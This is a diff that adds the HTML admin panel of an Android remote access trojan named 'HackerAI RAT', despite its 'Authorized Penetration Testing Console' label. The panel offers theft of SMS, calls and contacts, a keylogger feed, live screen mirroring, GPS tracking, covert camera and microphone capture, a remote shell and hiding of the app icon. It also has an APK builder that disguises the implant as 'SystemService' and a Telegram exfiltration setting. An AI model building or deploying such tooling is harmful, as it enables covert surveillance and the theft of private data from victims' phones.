@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HackerAI RAT - Admin Panel</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/xterm/5.5.0/xterm.min.css" />
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div id="login-page" class="page">
+    <div class="login-container">
+      <div class="login-header">
+        <div class="login-logo">
+          <svg viewBox="0 0 48 48" width="64" height="64">
+            <circle cx="24" cy="24" r="22" fill="none" stroke="#00ff88" stroke-width="2"/>
+            <path d="M16 28l4 4 12-12" fill="none" stroke="#00ff88" stroke-width="3" stroke-linecap="round"/>
+            <circle cx="24" cy="16" r="3" fill="#00ff88"/>
+          </svg>
+        </div>
+        <h1>HackerAI RAT</h1>
+        <p>Authorized Penetration Testing Console</p>
+      </div>
+      <form id="login-form">
+        <div class="form-group">
+          <label for="username">Username</label>
+          <input type="text" id="username" placeholder="Enter username" required>
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" placeholder="Enter password" required>
+        </div>
+        <button type="submit" class="btn btn-primary btn-full">Sign In</button>
+        <div id="login-error" class="error-msg"></div>
+      </form>
+    </div>
+  </div>
+
+  <div id="dashboard" class="page" style="display:none">
+    <div class="sidebar">
+      <div class="sidebar-header">
+        <h2>HackerAI RAT</h2>
+        <span class="badge" id="device-count-badge">0 Online</span>
+      </div>
+      <nav class="sidebar-nav">
+        <a href="#" data-tab="devices" class="nav-item active"><span class="nav-icon">📊</span> Devices</a>
+        <a href="#" data-tab="overview" class="nav-item"><span class="nav-icon">📱</span> Overview</a>
+        <a href="#" data-tab="sms" class="nav-item"><span class="nav-icon">💬</span> SMS</a>
+        <a href="#" data-tab="calls" class="nav-item"><span class="nav-icon">📞</span> Calls</a>
+        <a href="#" data-tab="contacts" class="nav-item"><span class="nav-icon">👤</span> Contacts</a>
+        <a href="#" data-tab="files" class="nav-item"><span class="nav-icon">📁</span> Files</a>
+        <a href="#" data-tab="screens" class="nav-item"><span class="nav-icon">🖥️</span> Live Screen</a>
+        <a href="#" data-tab="keylogger" class="nav-item"><span class="nav-icon">⌨️</span> Keylogger</a>
+        <a href="#" data-tab="notifications" class="nav-item"><span class="nav-icon">🔔</span> Notifications</a>
+        <a href="#" data-tab="actions" class="nav-item"><span class="nav-icon">⚡</span> Actions</a>
+        <a href="#" data-tab="shell" class="nav-item"><span class="nav-icon">💻</span> Shell</a>
+        <a href="#" data-tab="builder" class="nav-item"><span class="nav-icon">🔨</span> APK Builder</a>
+        <a href="#" data-tab="settings" class="nav-item"><span class="nav-icon">⚙️</span> Settings</a>
+      </nav>
+      <div class="sidebar-footer">
+        <span id="user-display">admin</span>
+        <button id="logout-btn" class="btn btn-small">Logout</button>
+      </div>
+    </div>
+
+    <div class="main-content">
+      <!-- DEVICES TAB -->
+      <div id="tab-devices" class="tab-content active">
+        <div class="tab-header">
+          <h2>Connected Devices</h2>
+          <div class="device-search">
+            <input type="text" id="device-search-input" placeholder="Search devices...">
+          </div>
+        </div>
+        <div class="device-grid" id="device-grid">
+          <div class="loading">Waiting for devices...</div>
+        </div>
+      </div>
+
+      <!-- OVERVIEW TAB -->
+      <div id="tab-overview" class="tab-content">
+        <div class="tab-header">
+          <h2>Device Overview</h2>
+          <select id="overview-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+        </div>
+        <div id="overview-content">
+          <div class="overview-grid">
+            <div class="card" id="device-info-card">
+              <h3>Device Information</h3>
+              <div id="device-info-content">Select a device</div>
+            </div>
+            <div class="card" id="device-map-card">
+              <h3>Live Location</h3>
+              <div id="device-map" style="height:300px"></div>
+            </div>
+            <div class="card" id="device-battery-card">
+              <h3>Battery & Status</h3>
+              <div id="device-battery-content">Select a device</div>
+            </div>
+            <div class="card" id="device-network-card">
+              <h3>Network Info</h3>
+              <div id="device-network-content">Select a device</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SMS TAB -->
+      <div id="tab-sms" class="tab-content">
+        <div class="tab-header">
+          <h2>SMS Messages</h2>
+          <select id="sms-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+          <div class="btn-group">
+            <button id="sms-refresh-btn" class="btn btn-secondary">Refresh</button>
+            <button id="sms-send-btn" class="btn btn-primary">Send SMS</button>
+          </div>
+        </div>
+        <div class="sms-search">
+          <input type="text" id="sms-search-input" placeholder="Search messages...">
+        </div>
+        <div class="sms-table-container">
+          <table class="data-table" id="sms-table">
+            <thead><tr><th>Sender</th><th>Body</th><th>Date</th><th>Read</th><th>Actions</th></tr></thead>
+            <tbody id="sms-body"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- CALLS TAB -->
+      <div id="tab-calls" class="tab-content">
+        <div class="tab-header">
+          <h2>Call Log</h2>
+          <select id="calls-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+          <button id="calls-refresh-btn" class="btn btn-secondary">Refresh</button>
+        </div>
+        <table class="data-table" id="calls-table">
+          <thead><tr><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th></tr></thead>
+          <tbody id="calls-body"></tbody>
+        </table>
+      </div>
+
+      <!-- CONTACTS TAB -->
+      <div id="tab-contacts" class="tab-content">
+        <div class="tab-header">
+          <h2>Contacts</h2>
+          <select id="contacts-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+          <div class="btn-group">
+            <button id="contacts-refresh-btn" class="btn btn-secondary">Refresh</button>
+            <button id="contacts-export-csv" class="btn btn-primary">Export CSV</button>
+            <button id="contacts-export-json" class="btn btn-primary">Export JSON</button>
+          </div>
+        </div>
+        <table class="data-table" id="contacts-table">
+          <thead><tr><th>Name</th><th>Phone</th><th>Email</th></tr></thead>
+          <tbody id="contacts-body"></tbody>
+        </table>
+      </div>
+
+      <!-- FILES TAB -->
+      <div id="tab-files" class="tab-content">
+        <div class="tab-header">
+          <h2>File Manager</h2>
+          <select id="files-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+          <div class="btn-group">
+            <button id="files-upload-btn" class="btn btn-primary">Upload File</button>
+            <button id="files-refresh-btn" class="btn btn-secondary">Refresh</button>
+          </div>
+        </div>
+        <div class="file-browser">
+          <div class="breadcrumb" id="file-breadcrumb">
+            <span class="breadcrumb-item" data-path="/">/</span>
+          </div>
+          <table class="data-table" id="files-table">
+            <thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
+            <tbody id="files-body"></tbody>
+          </table>
+          <div class="file-path-input">
+            <input type="text" id="file-path-input" placeholder="Enter path..." value="/sdcard">
+            <button id="file-go-btn" class="btn btn-secondary">Go</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- SCREENS TAB -->
+      <div id="tab-screens" class="tab-content">
+        <div class="tab-header">
+          <h2>Live Screen</h2>
+          <select id="screens-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+          <div class="btn-group">
+            <button id="screen-start-btn" class="btn btn-primary">Start Mirror</button>
+            <button id="screen-stop-btn" class="btn btn-danger">Stop</button>
+            <button id="screen-screenshot-btn" class="btn btn-secondary">Screenshot</button>
+          </div>
+        </div>
+        <div class="screen-container">
+          <div class="screen-viewport" id="screen-viewport">
+            <canvas id="screen-canvas"></canvas>
+            <img id="screen-img" style="display:none; max-width:100%; border:1px solid #333;">
+          </div>
+          <div class="screen-controls">
+            <label>FPS: <input type="range" id="screen-fps" min="1" max="5" value="2"> <span id="fps-display">2</span></label>
+            <p class="hint">Click on the screen to send touch events (relative coordinates)</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- KEYLOGGER TAB -->
+      <div id="tab-keylogger" class="tab-content">
+        <div class="tab-header">
+          <h2>Keylogger Feed</h2>
+          <select id="keylogger-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+          <div class="btn-group">
+            <input type="text" id="keylogger-filter" placeholder="Filter by app...">
+            <button id="keylogger-clear-btn" class="btn btn-danger">Clear</button>
+          </div>
+        </div>
+        <div class="keylogger-container" id="keylogger-container">
+          <div class="keylogger-entry system">
+            <span class="key-time">[System]</span>
+            <span class="key-text">Select a device to view keystrokes</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- NOTIFICATIONS TAB -->
+      <div id="tab-notifications" class="tab-content">
+        <div class="tab-header">
+          <h2>Live Notifications</h2>
+          <select id="notifications-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+          <button id="notifications-clear-btn" class="btn btn-danger">Clear</button>
+        </div>
+        <div class="notifications-container" id="notifications-container">
+          <div class="notification-entry system">
+            <span class="notif-app">System</span>
+            <span class="notif-text">Select a device to view notifications</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- ACTIONS TAB -->
+      <div id="tab-actions" class="tab-content">
+        <div class="tab-header">
+          <h2>Remote Actions</h2>
+          <select id="actions-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+        </div>
+        <div class="actions-grid">
+          <button class="action-btn" data-action="flashlight" data-param="true">🔦 Flashlight On</button>
+          <button class="action-btn" data-action="flashlight" data-param="false">🔦 Flashlight Off</button>
+          <button class="action-btn action-input" data-action="vibrate" data-param="500">📳 Vibrate (500ms)</button>
+          <button class="action-btn action-input" data-action="vibrate" data-param="2000">📳 Vibrate (2s)</button>
+          <button class="action-btn action-input" data-action="play_audio" data-param="">🎵 Play Audio</button>
+          <button class="action-btn action-input" data-action="tts" data-param="Hello from HackerAI RAT">🗣️ TTS: Hello</button>
+          <button class="action-btn action-input" data-action="open_url" data-param="https://example.com">🌐 Open URL</button>
+          <button class="action-btn action-input" data-action="toast" data-param="Hello from HackerAI">💬 Show Toast</button>
+          <button class="action-btn action-input" data-action="clipboard" data-param="HackerAI RAT">📋 Set Clipboard</button>
+          <button class="action-btn action-input" data-action="notification" data-param='{"title":"Alert","text":"This is a test notification"}'>🔔 Push Notification</button>
+          <button class="action-btn" data-action="lock">🔒 Lock Screen</button>
+          <button class="action-btn" data-action="reboot">🔄 Reboot</button>
+          <button class="action-btn" data-action="shutdown">⏻ Shutdown</button>
+          <button class="action-btn" data-action="hide_app">👻 Hide App Icon</button>
+          <button class="action-btn" data-action="get_device_info">ℹ️ Get Device Info</button>
+          <button class="action-btn" data-action="get_battery">🔋 Get Battery</button>
+          <button class="action-btn" data-action="get_network">📡 Get Network</button>
+          <button class="action-btn" data-action="get_packages">📦 List Packages</button>
+          <button class="action-btn" data-action="get_sms_inbox">💬 Get SMS Inbox</button>
+          <button class="action-btn" data-action="get_call_log">📞 Get Call Log</button>
+          <button class="action-btn" data-action="get_contacts">👤 Get Contacts</button>
+          <button class="action-btn" data-action="start_location_tracking">📍 Start GPS Tracking</button>
+          <button class="action-btn" data-action="stop_location_tracking">📍 Stop GPS</button>
+          <button class="action-btn" data-action="get_location_one_shot">📍 One-Shot Location</button>
+          <button class="action-btn" data-action="capture_front_camera">🤳 Front Camera</button>
+          <button class="action-btn" data-action="capture_rear_camera">📷 Rear Camera</button>
+          <button class="action-btn action-input" data-action="record_audio" data-param="10">🎤 Record Audio (10s)</button>
+          <button class="action-btn action-input" data-action="record_video" data-param='{"camera":"rear","duration":10}'>🎥 Record Video</button>
+        </div>
+        <div class="actions-response" id="actions-response"></div>
+      </div>
+
+      <!-- SHELL TAB -->
+      <div id="tab-shell" class="tab-content">
+        <div class="tab-header">
+          <h2>Remote Shell</h2>
+          <select id="shell-device-select" class="device-select">
+            <option value="">-- Select Device --</option>
+          </select>
+          <button id="shell-clear-btn" class="btn btn-danger">Clear</button>
+        </div>
+        <div class="shell-container">
+          <div class="shell-output" id="shell-output">
+            <div class="shell-line">[HackerAI Shell] Select a device and enter commands below</div>
+          </div>
+          <div class="shell-input-row">
+            <span class="shell-prompt">$</span>
+            <input type="text" id="shell-input" class="shell-input" placeholder="Enter command..." autocomplete="off">
+            <button id="shell-exec-btn" class="btn btn-primary">Execute</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- APK BUILDER TAB -->
+      <div id="tab-builder" class="tab-content">
+        <div class="tab-header">
+          <h2>APK Builder</h2>
+        </div>
+        <div class="builder-container">
+          <div class="card">
+            <h3>Build Custom APK</h3>
+            <form id="builder-form">
+              <div class="form-group">
+                <label for="builder-server-url">Server URL *</label>
+                <input type="text" id="builder-server-url" placeholder="https://your-server.com or http://192.168.1.100" required>
+              </div>
+              <div class="form-group">
+                <label for="builder-server-port">Server Port</label>
+                <input type="number" id="builder-server-port" value="3000">
+              </div>
+              <div class="form-group">
+                <label for="builder-app-name">App Name</label>
+                <input type="text" id="builder-app-name" value="SystemService">
+              </div>
+              <div class="form-group">
+                <label for="builder-package">Package Name</label>
+                <input type="text" id="builder-package" value="com.android.systemservice">
+              </div>
+              <button type="submit" class="btn btn-primary btn-full">Build APK</button>
+            </form>
+            <div id="builder-status" class="builder-status"></div>
+          </div>
+          <div class="card">
+            <h3>Build History</h3>
+            <div id="build-history"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- SETTINGS TAB -->
+      <div id="tab-settings" class="tab-content">
+        <div class="tab-header">
+          <h2>Settings</h2>
+        </div>
+        <div class="settings-container">
+          <div class="card">
+            <h3>Server Info</h3>
+            <div id="server-stats"></div>
+          </div>
+          <div class="card">
+            <h3>Telegram Bot</h3>
+            <form id="telegram-form">
+              <div class="form-group">
+                <label class="toggle-label">
+                  <input type="checkbox" id="telegram-enabled"> Enable Telegram Bot
+                </label>
+              </div>
+              <div class="form-group">
+                <label for="telegram-token">Bot Token</label>
+                <input type="password" id="telegram-token" placeholder="Bot token from @BotFather">
+              </div>
+              <div class="form-group">
+                <label for="telegram-chat-id">Chat ID</label>
+                <input type="text" id="telegram-chat-id" placeholder="Telegram chat ID">
+              </div>
+              <button type="submit" class="btn btn-primary">Save Telegram Config</button>
+            </form>
+          </div>
+          <div class="card">
+            <h3>Account</h3>
+            <button id="change-password-btn" class="btn btn-secondary">Change Password</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODALS -->
+  <div id="send-sms-modal" class="modal">
+    <div class="modal-content">
+      <span class="modal-close">&times;</span>
+      <h3>Send SMS</h3>
+      <form id="send-sms-form">
+        <div class="form-group">
+          <label for="sms-phone">Phone Number</label>
+          <input type="text" id="sms-phone" placeholder="+1234567890" required>
+        </div>
+        <div class="form-group">
+          <label for="sms-message">Message</label>
+          <textarea id="sms-message" rows="4" placeholder="Message text"></textarea>
+        </div>
+        <button type="submit" class="btn btn-primary btn-full">Send SMS</button>
+      </form>
+    </div>
+  </div>
+
+  <div id="image-modal" class="modal">
+    <div class="modal-content image-modal-content">
+      <span class="modal-close">&times;</span>
+      <img id="modal-image" src="" alt="Preview">
+    </div>
+  </div>
+
+  <div id="action-input-modal" class="modal">
+    <div class="modal-content">
+      <span class="modal-close">&times;</span>
+      <h3 id="action-input-title">Enter Value</h3>
+      <form id="action-input-form">
+        <div class="form-group">
+          <label id="action-input-label" for="action-input-value">Value</label>
+          <input type="text" id="action-input-value" required>
+        </div>
+        <button type="submit" class="btn btn-primary btn-full">Execute</button>
+      </form>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.8.1/socket.io.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/xterm/5.5.0/xterm.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.5.0/dist/chart.umd.min.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
